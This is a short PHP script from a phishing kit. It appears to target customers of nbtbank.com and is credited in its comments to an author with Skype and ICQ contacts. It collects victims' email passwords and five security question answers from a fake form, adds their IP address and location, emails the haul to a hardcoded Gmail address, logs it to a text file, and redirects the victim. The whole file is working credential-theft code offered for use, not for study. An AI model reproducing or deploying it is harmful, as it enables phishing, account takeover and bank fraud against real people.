<?php
// THIS SCRIPT CODED BY saradauchia2
// CONTACT US SKYPE : saradauchia2
// ICQ : 746318279
	
	
	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
    $message .= "---|Ghost Rider|---\n";
	$message .= "---|Email Access|---\n";
    $message .= "Email: " . $_POST['Email'] . "\n"; 
    $message .= "Password: " . $_POST['EmailP'] . "\n";
	$message .= "---|Security Questions|---\n";
	$message .= "Question 1: " . $_POST['question1'] . "\n"; 
    $message .= "answer 1: " . $_POST['answer1'] . "\n";
	$message .= "Question 2: " . $_POST['question2'] . "\n"; 
    $message .= "answer 2: " . $_POST['answer2'] . "\n";
	$message .= "Question 3: " . $_POST['question3'] . "\n"; 
    $message .= "answer 3: " . $_POST['answer3'] . "\n";
	$message .= "Question 4: " . $_POST['question4'] . "\n"; 
    $message .= "answer 4: " . $_POST['answer4'] . "\n";
	$message .= "Question 5: " . $_POST['question5'] . "\n"; 
    $message .= "answer 5: " . $_POST['answer5'] . "\n";
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";
	
	$send = "100fareedah@gmail.com";

	$subject = "nbtbank.com l $ip".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
	window.location="complate.html";
</script>

